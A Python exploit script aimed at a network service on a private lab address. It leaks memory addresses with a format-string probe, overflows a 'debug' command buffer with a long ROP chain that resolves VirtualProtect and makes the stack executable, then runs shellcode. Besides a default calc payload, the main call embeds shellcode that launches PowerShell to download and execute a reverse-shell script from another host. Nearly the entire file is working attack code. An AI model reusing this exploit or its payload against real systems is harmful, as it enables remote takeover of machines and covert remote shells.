#!/usr/bin/env python3
from __future__ import annotations
from socket import socket, AF_INET, SOCK_STREAM
from struct import pack, unpack
from typing import TypeVar, Union, Generic
from binascii import unhexlify

_B = TypeVar("_B", bound=Union[str, bytes, None])
_S = TypeVar("_S", bound=Union[socket, None])


# noinspection SpellCheckingInspection,PyShadowingNames
class Exploit(Generic[_B, _S]):
    def __init__(self, **kw):
        self.sock: _S = socket(AF_INET, SOCK_STREAM)
        self.shellcode: _B = (
            # Default shellcode x86 calc:
            # msfvenom -p windows/exec cmd='calc' -b "\x00\x0a\x0d"
            b"\xba\xc1\x8e\xb4\xe5\xda\xde\xd9\x74\x24\xf4\x58\x33"
            b"\xc9\xb1\x30\x83\xc0\x04\x31\x50\x0f\x03\x50\xce\x6c"
            b"\x41\x19\x38\xf2\xaa\xe2\xb8\x93\x23\x07\x89\x93\x50"
            b"\x43\xb9\x23\x12\x01\x35\xcf\x76\xb2\xce\xbd\x5e\xb5"
            b"\x67\x0b\xb9\xf8\x78\x20\xf9\x9b\xfa\x3b\x2e\x7c\xc3"
            b"\xf3\x23\x7d\x04\xe9\xce\x2f\xdd\x65\x7c\xc0\x6a\x33"
            b"\xbd\x6b\x20\xd5\xc5\x88\xf0\xd4\xe4\x1e\x8b\x8e\x26"
            b"\xa0\x58\xbb\x6e\xba\xbd\x86\x39\x31\x75\x7c\xb8\x93"
            b"\x44\x7d\x17\xda\x69\x8c\x69\x1a\x4d\x6f\x1c\x52\xae"
            b"\x12\x27\xa1\xcd\xc8\xa2\x32\x75\x9a\x15\x9f\x84\x4f"
            b"\xc3\x54\x8a\x24\x87\x33\x8e\xbb\x44\x48\xaa\x30\x6b"
            b"\x9f\x3b\x02\x48\x3b\x60\xd0\xf1\x1a\xcc\xb7\x0e\x7c"
            b"\xaf\x68\xab\xf6\x5d\x7c\xc6\x54\x0b\x83\x54\xe3\x79"
            b"\x83\x66\xec\x2d\xec\x57\x67\xa2\x6b\x68\xa2\x87\x84"
            b"\x22\xef\xa1\x0c\xeb\x65\xf0\x50\x0c\x50\x36\x6d\x8f"
            b"\x51\xc6\x8a\x8f\x13\xc3\xd7\x17\xcf\xb9\x48\xf2\xef"
            b"\x6e\x68\xd7\x93\xf1\xfa\xbb\x53"
        )
        self.address: str = "192.168.43.1"
        self.command: bytes = b"debug"
        self.stack: int = 0x00000000
        self.base: int = 0x62390000
        self.port: int = 65534
        self.buffSize: int = 4
        self.crash: int = 719
        self.gadgets: dict = {
            "add eax, 0x10": 0x0000178a,
            "add eax, 0x20": 0x0000179e,
            "add eax, 0x24": 0x000017a2,
            "add eax, 0x3c": 0x000017a6,
            "add eax, 1": 0x0000179a,
            "add eax, 4": 0x000017aa,
            "add eax, 8": 0x000017b2,
            "add eax, ebx": 0x000017b6,
            "add eax, esi": 0x000017bc,
            "add ebx, 0xc": 0x000017d3,
            "add ebx, 8": 0x000017db,
            "add ecx, 0x10": 0x000017df,
            "add ecx, 0x14": 0x000017e3,
            "add ecx, 0x24": 0x000017f3,
            "add ecx, 0x28": 0x000017f7,
            "add ecx, 4": 0x000017ff,
            "add ecx, eax": 0x00001807,
            "add edi, eax": 0x00001810,
            "add esp, 0x3c": 0x0000253e,
            "cld": 0x00001317,
            "cmove edi, esi": 0x00001871,
            "cmp eax, dword ptr [ebp + 0x28]": 0x00001898,
            "cmp eax, ecx": 0x000018b0,
            "mov dword ptr [ebp + 0x10], eax": 0x00001911,
            "mov dword ptr [ebp + 0x14], eax": 0x00001919,
            "mov dword ptr [ebp + 0x18], eax": 0x0000191d,
            "mov dword ptr [ebp + 0x1c], eax": 0x00001925,
            "mov dword ptr [ebp + 0x20], eax": 0x00001929,
            "mov dword ptr [ebp + 0x24], eax": 0x00001931,
            "mov dword ptr [ebp + 0x28], eax": 0x00001935,
            "mov dword ptr [ebp + 0x30], eax": 0x00001939,
            "mov dword ptr [ebp + 0xc], eax": 0x00001941,
            "mov dword ptr [ebp + 4], eax": 0x00001945,
            "mov dword ptr [ebp + 8], eax": 0x00001949,
            "mov dword ptr [ebp + eax], esp": 0x0000194d,
            "mov dword ptr [ebp + ecx], eax": 0x00001952,
            "mov dword ptr [ebp - 0x10], eax": 0x00001915,
            "mov dword ptr [ebp - 0x18], eax": 0x00001921,
            "mov dword ptr [ebp - 0x20], eax": 0x0000192d,
            "mov dword ptr [ebp - 0x30], eax": 0x0000193d,
            "mov ax, word ptr [ecx]": 0x000018d7,
            "mov eax, dword ptr [eax + 0x14]": 0x000019b1,
            "mov eax, dword ptr [eax + 0x1c]": 0x000019b5,
            "mov eax, dword ptr [eax + 0x78]": 0x000019b9,
            "mov eax, dword ptr [eax + ebx]": 0x000019bd,
            "mov eax, dword ptr [eax + ecx*4]": 0x000019c1,
            "mov eax, dword ptr [eax]": 0x000019d5,
            "mov eax, dword ptr [ebp + 0x10]": 0x000019d8,
            "mov eax, dword ptr [ebp + 0x14]": 0x000019dc,
            "mov eax, dword ptr [ebp + 0x18]": 0x000019e0,
            "mov eax, dword ptr [ebp + 0x1c]": 0x000019e4,
            "mov eax, dword ptr [ebp + 0x20]": 0x000019e8,
            "mov eax, dword ptr [ebp + 0x24]": 0x000019ec,
            "mov eax, dword ptr [ebp + 0x28]": 0x000019f0,
            "mov eax, dword ptr [ebp + 0xc]": 0x000019f4,
            "mov eax, dword ptr [ebp + 4]": 0x000019f8,
            "mov eax, dword ptr [ebp + 8]": 0x000019fc,
            "mov eax, dword ptr [ebp - 4] ; leav": 0x00001528,
            "mov eax, dword ptr [ecx + 0x3c]": 0x00001a09,
            "mov eax, dword ptr [ecx]": 0x000018d8,
            "mov eax, dword ptr fs:[0x30]": 0x00001a51,
            "mov eax, ebp": 0x00001a5c,
            "mov eax, ebx": 0x00001a5f,
            "mov eax, esi": 0x00001a6b,
            "mov eax, esp": 0x00001a6e,
            "mov ecx, dword ptr [ecx + eax*4]": 0x00001a88,
            "mov ecx, eax": 0x000018f7,
            "mov ecx, esp": 0x00001a8c,
            "mov esp, eax": 0x00001a92,
            "mov esp, edi": 0x00001a9b,
            "pop eax": 0x00001aae,
            "ret": 0x000019cf,
            "sub eax, 1": 0x00001b44,
            "sub ebx, 4": 0x00001b52,
            "xchg eax, ebx": 0x00001b9d,
            "xchg eax, ecx": 0x00001b9f,
            "xchg eax, edx": 0x00001ba1,
            "xchg eax, esi": 0x00001bb4,
            "xchg ebp, ecx": 0x00001ba5,
            "xchg edx, ecx": 0x00001bb1,
            "xchg esi, edi": 0x00001bb9,
            "xor eax, 0xffffffff": 0x00001bcc,
            "xor eax, eax": 0x00001bd0,
            "xor edi, edi": 0x00001bc9,
            "int 3": 0x000018c4,
        }
        self.__dict__.update(**kw)

    @staticmethod
    def getPadding(size: int, byte: int = 0x90) -> bytes:
        return bytes([byte]) * size

    @staticmethod
    def toString(data: _B) -> str:
        return (
            data if isinstance(data, str)
            else data.decode()
        )

    @staticmethod
    def toHexAddress(data: int, right: bool = False) -> str:
        address = hex(data).lstrip("0x")
        return (
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )

    def toAddress(self, data: _B, right: bool = False) -> int:
        address = self.toString(data).strip()
        address = str(
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )
        return self.unpack(unhexlify(address))

    def gadget(self, key: str, *ag, **kw) -> int:
        return self.gadgets.get(key, *ag, **kw)

    @staticmethod
    def pack(address: int) -> bytes:
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> int:
        return unpack(">L", address)[0]

    def connect(self) -> Exploit:
        try:
            self.sock: socket = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.address, self.port))
        except Exception as err:
            raise Exception(f"Connect error: {err}")
        return self

    def send(self, buffer: bytes) -> Exploit:
        try:
            self.sock.send(buffer)
        except Exception as err:
            raise Exception(f"Send error: {err}")
        return self

    def recv(self, size: int) -> bytes:
        try:
            return self.sock.recv(size)
        except Exception as err:
            raise Exception(f"Receive error: {err}")

    def close(self) -> Exploit:
        try:
            self.sock.close()
        except Exception as err:
            print(f"Close error: {err}")
        return self

    def calcGadget(self, *ag, **kw) -> bytes:
        try:
            return self.pack(self.base + self.gadget(*ag, **kw))
        except Exception as err:
            raise Exception(f"Gadget error: {err}{ag}{kw}")

    def rawGadget(self, *ag, **kw) -> bytes:
        try:
            return self.pack(self.gadget(*ag, **kw))
        except Exception as err:
            raise Exception(f"Gadget error: {err}")

    def triggerRop(self, padding: int = 0x90) -> bytes:
        code: bytes = self.command
        code += self.getPadding(self.crash, padding)
        return code

    def recvUntil(self, flag: bytes) -> bytes:
        data: bytes = bytes()
        while True:
            try:
                data += self.recv(self.buffSize)
                if flag in data:
                    break
            except Exception as er:
                print(f"Recieve error: {er}")
                break
        return data

    def leakOffsets(self) -> Exploit:
        try:
            # Leak offsets to calculate image base address:
            _ = self.recvUntil(b">")
            self.send(b".%x.%x.WOOT")
            data: list[bytes] = self.recvUntil(b"WOOT").split(b".")
            self.base = int(self.toAddress(data[2][:4], True))
            self.stack = int(self.toAddress(data[1], False))
            print(
                "base: {} \nstack: {}\n".format(
                    self.toHexAddress(self.base),
                    self.toHexAddress(self.stack),
                )
            )
        except Exception as err:
            raise Exception(f"Error leaking offsets: {err}")
        return self.setAliases()

    def setAliases(self) -> Exploit:
        self.gadgets.update(
            getVar0=self.gadget("mov eax, dword ptr [ebp + 4]"),
            getVar1=self.gadget("mov eax, dword ptr [ebp + 8]"),
            getVar2=self.gadget("mov eax, dword ptr [ebp + 0xc]"),
            getVar3=self.gadget("mov eax, dword ptr [ebp + 0x10]"),
            getVar4=self.gadget("mov eax, dword ptr [ebp + 0x14]"),
            getVar5=self.gadget("mov eax, dword ptr [ebp + 0x18]"),
            getVar6=self.gadget("mov eax, dword ptr [ebp + 0x1c]"),
            getVar7=self.gadget("mov eax, dword ptr [ebp + 0x20]"),
            getVar8=self.gadget("mov eax, dword ptr [ebp + 0x24]"),
            getVar9=self.gadget("mov eax, dword ptr [ebp + 0x28]"),
            setVar0=self.gadget("mov dword ptr [ebp + 4], eax"),
            setVar1=self.gadget("mov dword ptr [ebp + 8], eax"),
            setVar2=self.gadget("mov dword ptr [ebp + 0xc], eax"),
            setVar3=self.gadget("mov dword ptr [ebp + 0x10], eax"),
            setVar4=self.gadget("mov dword ptr [ebp + 0x14], eax"),
            setVar5=self.gadget("mov dword ptr [ebp + 0x18], eax"),
            setVar6=self.gadget("mov dword ptr [ebp + 0x1c], eax"),
            setVar7=self.gadget("mov dword ptr [ebp + 0x20], eax"),
            setVar8=self.gadget("mov dword ptr [ebp + 0x24], eax"),
            setVar9=self.gadget("mov dword ptr [ebp + 0x28], eax"),
        )
        return self

    def ropChain(self) -> bytes:
        # Prepare for ROP, save stack pointers, return to ROP:
        code: bytes = b""
        try:
            code += self.triggerRop(0xcc)     # trigger overwrite
            code += self.calcGadget("ret")    # padding
            code += self.calcGadget("ret")    # padding
            code += self.calcGadget("ret")    # padding

            # Begin
            code += self.calcGadget("ret")  # breakpoint
            # New stack frame
            code += self.calcGadget("mov ecx, esp")     # store stack pointer to ecx
            code += self.calcGadget("xchg ebp, ecx")    # store stack to base pointer
            code += self.calcGadget("add esp, 0x3c")    # jump over variable section of stack
            # Variables
            code += self.pack(0xffffffff)   # variable 0 (ebp + 0x04 / 8)
            code += self.pack(0xffffff11)   # variable 1 (ebp + 0x08 / c)
            code += self.pack(0xffffff22)   # variable 2 (ebp + 0x0c / 10)
            code += self.pack(0xffffff33)   # variable 3 (ebp + 0x10 / 14)
            code += self.pack(0xffffff44)   # variable 4 (ebp + 0x14 / 18)
            code += self.pack(0xffffff55)   # variable 5 (ebp + 0x18 / 1c)
            code += self.pack(0xffffff66)   # variable 6 (ebp + 0x1c / 20)
            code += self.pack(0xffffff77)   # variable 7 (ebp + 0x20 / 24)
            code += self.pack(0xffffff88)   # variable 8 (ebp + 0x24 / 28)
            code += self.pack(0xffffff99)   # variable 9 (ebp + 0x28 / 2c)
            code += self.pack(0xffffff10)   # variable 10 (ebp + 0x2c / 30)
            code += b"Virt"                 # variable 11 (ebp + 0x30 / 34)
            code += b"ualP"                 # variable 12 (ebp + 0x34 / 38)
            code += b"rote"                 # variable 13 (ebp + 0x38 /3c) ct00
            code += b"tect"                 # variable 14 (ebp + 0x3c / 40)
            # Address of kernel32 dll
            code += self.calcGadget("ret")                              # padding
            code += self.calcGadget("xor eax, eax")                     # obtain PEB
            code += self.calcGadget("xchg eax, ebx")
            code += self.calcGadget("xor eax, eax")
            code += self.calcGadget("add ebx, 0xc")
            code += self.calcGadget("mov eax, dword ptr fs:[0x30]")     # eax has PEB
            code += self.calcGadget("mov eax, dword ptr [eax + ebx]")   # eax has LDR
            code += self.calcGadget("add ebx, 8")
            code += self.calcGadget("mov eax, dword ptr [eax + ebx]")   # InMemoryOrderModuleList
            code += self.calcGadget("mov eax, dword ptr [eax]")         # current module
            code += self.calcGadget("mov eax, dword ptr [eax]")         # ntdll.dll
            code += self.calcGadget("sub ebx, 4")
            code += self.calcGadget("mov eax, dword ptr [eax + ebx]")   # eax has kernel32.dll base
            code += self.calcGadget("setVar0")                          # save kernel32 base
            # Address of PE signature
            code += self.calcGadget("xchg eax, ebx")
            code += self.calcGadget("mov eax, ebx")
            code += self.calcGadget("mov ecx, eax")
            code += self.calcGadget("mov eax, dword ptr [ecx + 0x3c]")
            code += self.calcGadget("add eax, ebx")
            # 1 - Address of Export Table
            code += self.calcGadget("mov eax, dword ptr [eax + 0x78]")
            code += self.calcGadget("add eax, ebx")
            code += self.calcGadget("setVar1")
            # 2 - Number of exported functions
            code += self.calcGadget("mov eax, dword ptr [eax + 0x14]")
            code += self.calcGadget("setVar2")
            # 3 - Address of Exported functions table
            code += self.calcGadget("getVar1")
            code += self.calcGadget("mov eax, dword ptr [eax + 0x1c]")
            code += self.calcGadget("add eax, ebx")
            code += self.calcGadget("setVar3")
            # 4 - Address of name pointer table
            code += self.calcGadget("getVar1")
            code += self.calcGadget("add eax, 0x20")
            code += self.calcGadget("mov eax, dword ptr [eax]")
            code += self.calcGadget("add eax, ebx")
            code += self.calcGadget("setVar4")
            # 5 - Address of functions ordinal table  - Var5
            code += self.calcGadget("getVar1")
            code += self.calcGadget("add eax, 0x24")
            code += self.calcGadget("mov eax, dword ptr [eax]")
            code += self.calcGadget("add eax, ebx")
            code += self.calcGadget("setVar5")

            # Pre-loop
            code += self.calcGadget("ret")  # padding
            # 6 - Pre-loop counter
            code += self.calcGadget("xor eax, eax")
            code += self.calcGadget("setVar6")            # initial count 0
            # 7 - Pre-loop fail loop address
            code += self.calcGadget("mov eax, esp")       # eax has esp
            code += self.calcGadget("add eax, 0x10")      # adjust fail pointer
            code += self.calcGadget("setVar7")            # save loop address

            # Loop
            code += self.calcGadget("ret")                  # padding
            code += self.calcGadget("ret")                  # padding
            code += self.calcGadget("ret")                  # padding
            code += self.calcGadget("ret")                  # padding
            # Check counter
            code += self.calcGadget("mov eax, ebp")        # eax has ebp
            code += self.calcGadget("add eax, 0x24")       # adjust add
            code += self.calcGadget("add eax, 4")          # adjust add
            code += self.calcGadget("xchg eax, esi")       # esi has fail condition
            code += self.calcGadget("xor edi, edi")
            code += self.calcGadget("mov eax, esp")        # eax has esp
            code += self.calcGadget("add eax, 0x24")       # adjust success
            code += self.calcGadget("add edi, eax")        # edi has success condition
            code += self.calcGadget("getVar2")             # retrieve number of functions
            code += self.calcGadget("xchg eax, ecx")       # ecx has number of functions
            code += self.calcGadget("getVar6")             # eax has current count
            code += self.calcGadget("cmp eax, ecx")        # compare count to total
            code += self.calcGadget("cmove edi, esi")      # set conditional return
            code += self.calcGadget("mov esp, edi")        # exit or continue

            # Check 1
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            # 8 - Check 1 set name value
            code += self.calcGadget("xchg eax, esi")  # clear
            code += self.calcGadget("getVar6")        # get counter
            code += self.calcGadget("xchg eax, ecx")  # ecx has counter
            code += self.calcGadget("getVar4")        # eax has name pointer table
            code += self.calcGadget("cld")            # clear directional flags
            code += self.calcGadget("mov eax, dword ptr [eax + ecx*4]")  # eax has rva of next function
            code += self.calcGadget("add eax, ebx")   # eax has address of function name
            code += self.calcGadget("setVar8")        # save address
            code += self.calcGadget("xchg eax, ecx")  # eax has counter
            code += self.calcGadget("add eax, 1")     # increase count
            code += self.calcGadget("setVar6")        # save count
            # 9 - Check 1 conditions
            code += self.calcGadget("ret")              # padding
            code += self.calcGadget("getVar8")          # retrieve address
            code += self.calcGadget("mov eax, dword ptr [eax]")  # obtain value (name)
            code += self.calcGadget("setVar9")          # save name
            code += self.calcGadget("mov eax, esp")
            code += self.calcGadget("add eax, 0x3c")
            code += self.calcGadget("xor edi, edi")
            code += self.calcGadget("add edi, eax")     # edi has success condition
            code += self.calcGadget("getVar7")
            code += self.calcGadget("xchg eax, esi")    # esi has fail condition
            code += self.calcGadget("xchg esi, edi")    # esi success, edi fail
            # Check 1 compare Virt
            code += self.calcGadget("mov eax, ebp")
            code += self.calcGadget("xchg eax, ecx")
            code += self.calcGadget("add ecx, 0x24")
            code += self.calcGadget("add ecx, 0x10")
            code += self.calcGadget("mov eax, dword ptr [ecx]")  # eax has Virt
            code += self.calcGadget("cmp eax, dword ptr [ebp + 0x28]")
            code += self.calcGadget("cmove edi, esi")
            code += self.calcGadget("mov esp, edi")      # loop or continue

            # Check 2
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            # 9 - Check 2 conditions
            code += self.calcGadget("xchg esi, edi")    # esi success, edi fail
            code += self.calcGadget("xchg eax, esi")    # esi has fail condition
            code += self.calcGadget("getVar8")          # retrieve address to var 8
            code += self.calcGadget("add eax, 4")
            code += self.calcGadget("mov eax, dword ptr [eax]")  # eax next first four bytes
            code += self.calcGadget("setVar9")          # next four bytes of name
            code += self.calcGadget("mov eax, esp")
            code += self.calcGadget("add eax, 0x3c")
            code += self.calcGadget("xor edi, edi")
            code += self.calcGadget("add edi, eax")     # edi has success condition
            code += self.calcGadget("getVar7")
            code += self.calcGadget("xchg eax, esi")    # esi has fail condition
            code += self.calcGadget("xchg esi, edi")    # esi success, edi fail
            # Check 2 ualP
            code += self.calcGadget("mov eax, ebp")
            code += self.calcGadget("xchg eax, ecx")
            code += self.calcGadget("add ecx, 0x28")
            code += self.calcGadget("add ecx, 0x10")
            code += self.calcGadget("mov eax, dword ptr [ecx]")  # eax has ualP
            code += self.calcGadget("cmp eax, dword ptr [ebp + 0x28]")
            code += self.calcGadget("cmove edi, esi")
            code += self.calcGadget("mov esp, edi")      # loop or continue

            # Check 3
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            # 9 - Check 3 conditions
            code += self.calcGadget("xchg esi, edi")  # esi success, edi fail
            code += self.calcGadget("xchg eax, esi")  # esi has fail condition
            code += self.calcGadget("getVar8")        # retrieve address to var 8
            code += self.calcGadget("add eax, 8")
            code += self.calcGadget("mov eax, dword ptr [eax]")  # eax next first four bytes
            code += self.calcGadget("setVar9")        # next four bytes of name
            code += self.calcGadget("mov eax, esp")
            code += self.calcGadget("add eax, 0x3c")
            code += self.calcGadget("xor edi, edi")
            code += self.calcGadget("add edi, eax")   # edi has success condition
            code += self.calcGadget("getVar7")
            code += self.calcGadget("xchg eax, esi")  # esi has fail condition
            code += self.calcGadget("xchg esi, edi")  # esi success, edi fail
            # Check 3 rote
            code += self.calcGadget("mov eax, ebp")
            code += self.calcGadget("xchg eax, ecx")
            code += self.calcGadget("add ecx, 0x28")
            code += self.calcGadget("add ecx, 0x14")
            code += self.calcGadget("mov eax, dword ptr [ecx]")  # eax has etor
            code += self.calcGadget("cmp eax, dword ptr [ebp + 0x28]")
            code += self.calcGadget("cmove edi, esi")
            code += self.calcGadget("mov esp, edi")  # loop or continue

            # Check 4
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            code += self.calcGadget("ret")            # padding
            # 9 - Check 4 conditions
            code += self.calcGadget("xchg esi, edi")  # esi success, edi fail
            code += self.calcGadget("xchg eax, esi")  # esi has fail condition
            code += self.calcGadget("getVar8")        # retrieve address: ect0 / tect
            code += self.calcGadget("add eax, 8")  # rote
            code += self.calcGadget("add eax, 1")  # otec
            code += self.calcGadget("add eax, 1")  # tect
            code += self.calcGadget("mov eax, dword ptr [eax]")  # eax next two bytes
            code += self.calcGadget("setVar9")        # store name
            code += self.calcGadget("mov eax, esp")
            code += self.calcGadget("add eax, 0x3c")
            code += self.calcGadget("xor edi, edi")
            code += self.calcGadget("add edi, eax")   # edi success condition
            code += self.calcGadget("getVar7")
            code += self.calcGadget("xchg eax, esi")  # esi fail condition
            code += self.calcGadget("xchg esi, edi")  # esi success / edi fail
            # Check 4 tect
            code += self.calcGadget("mov eax, ebp")
            code += self.calcGadget("xchg eax, ecx")
            code += self.calcGadget("add ecx, 0x28")
            code += self.calcGadget("add ecx, 0x14")
            code += self.calcGadget("add ecx, 4")
            code += self.calcGadget("mov eax, dword ptr [ecx]")  # eax has tect
            code += self.calcGadget("cmp eax, dword ptr [ebp + 0x28]")
            code += self.calcGadget("cmove edi, esi")
            code += self.calcGadget("mov esp, edi")               # loop or continue

            # VirtualProtect address
            code += self.calcGadget("ret")
            code += self.calcGadget("ret")
            code += self.calcGadget("ret")
            # 6 - VirtualProtect adjust count
            code += self.calcGadget("xchg esi, edi")    # reset
            code += self.calcGadget("xchg eax, esi")    # reset
            code += self.calcGadget("getVar6")          # retrieve count
            code += self.calcGadget("sub eax, 1")       # fix count
            code += self.calcGadget("setVar6")          # eax has count
            # VirtualProtect retrieve ordinal and export address
            code += self.calcGadget("getVar5")          # retrieve ordinal table
            code += self.calcGadget("xchg eax, ecx")    # ecx oridinal table
            code += self.calcGadget("getVar3")          # retrieve export address table
            code += self.calcGadget("xchg eax, edx")    # edx export address table
            # 1 - VirtualProtect calculate address
            code += self.calcGadget("ret")              # padding
            code += self.calcGadget("getVar6")          # retrieve count
            code += self.calcGadget("xchg eax, esi")    # esi has count
            code += self.calcGadget("mov eax, esi")     # eax has count
            code += self.calcGadget("add eax, esi")     # eax has count*2
            code += self.calcGadget("add ecx, eax")     # ecx has ordinal+count*2
            code += self.calcGadget("cld")              # clear directional flags
            code += self.calcGadget("mov ax, word ptr [ecx]")  # ax has ordinal number
            code += self.calcGadget("xchg edx, ecx")    # ecx has export table
            code += self.calcGadget("mov ecx, dword ptr [ecx + eax*4]")  # ecx has virtualprotect rva
            code += self.calcGadget("xchg eax, ecx")    # eax has rva
            code += self.calcGadget("add eax, ebx")     # eax has virtualprotect
            code += self.calcGadget("setVar1")          # store virtualprotect

            # VirtualProtect call
            code += self.calcGadget("ret")
            # VirtualProtect set variables
            # VirtualProtect address
            # 4 - size of shellcode/memory
            code += self.calcGadget("pop eax")              # eax has xor size
            code += self.pack(0xffffffff ^ 0x600)           # may be 0x700 if larger code
            code += self.calcGadget("xor eax, 0xffffffff")  # eax has size
            code += self.calcGadget("setVar4")              # set dwSize
            # 5 - rwx permissions for memory
            code += self.calcGadget("pop eax")              # eax has xor rwx
            code += self.pack(0xffffffff ^ 0x40)
            code += self.calcGadget("xor eax, 0xffffffff")  # eax has rwx
            code += self.calcGadget("setVar5")              # set flNewProtect
            # 2 - address of shellcode
            code += self.calcGadget("mov eax, esp")         # address of shellcode
            code += self.calcGadget("add eax, 0x3c")        # adjust relative location - skip 15
            code += self.calcGadget("setVar2")              # set retAddress
            # 3 - address of memory for api call
            code += self.calcGadget("mov eax, ebp")         # adjust relative location
            code += self.calcGadget("setVar3")              # set lpAddress
            # 6 - writable address for output
            code += self.calcGadget("mov eax, ebp")         # variable base
            code += self.calcGadget("add eax, 0x10")        # adjust relative location
            code += self.calcGadget("add eax, 0x24")        # adjust relative location
            code += self.calcGadget("setVar6")              # get lpflOldProtect
            # Execute VirtualProtect
            code += self.calcGadget("mov eax, ebp")         # variable base
            code += self.calcGadget("add eax, 8")           # location of API call
            code += self.calcGadget("mov esp, eax")         # stack pivot
            code += self.calcGadget("ret")                  # padding

            # Execute shellcode
            code += self.pack(0x90909090) * 10              # padding 4 * 10 = 0x28
            code += self.shellcode                          # shellcode
            code += self.pack(0xcccccccc) * 27              # padding 4 * 27  = 0x6c
        except Exception as err:
            raise Exception(f"ROP prologue error: {err}")
        return code

    def run(self) -> Exploit:
        try:
            self.connect().leakOffsets().send(self.ropChain()).close()
        except Exception as err:
            print(f"Exception running exploit: {err}")
            self.close()
        return self


if __name__ == '__main__':
    # System information:
    # OS Name:                   Microsoft Windows 10 Pro
    # OS Version:                10.0.19044 N/A Build 19044
    # System Type:               x64-based PC
    # Intel64 Family 6 Model 165 Stepping 2 GenuineIntel ~2592 Mhz
    # Exploit(shellcode=b"...", address='192.168.43.1', port=1337)
    Exploit(shellcode=b"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x70\x73\x31\x29\x68\x74\x63\x70\x2e\x68\x72\x73\x65\x2d\x68\x72\x65\x76\x65\x68\x31\x32\x38\x2f\x68\x2e\x34\x33\x2e\x68\x2e\x31\x36\x38\x68\x2f\x31\x39\x32\x68\x74\x70\x3a\x2f\x68\x72\x20\x68\x74\x68\x78\x28\x69\x77\x68\x63\x20\x69\x65\x68\x78\x65\x20\x2d\x68\x6c\x6c\x2e\x65\x68\x72\x73\x68\x65\x68\x70\x6f\x77\x65\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x41\xff\xff\xff\x31\xd2\x52\xff\xd0").run()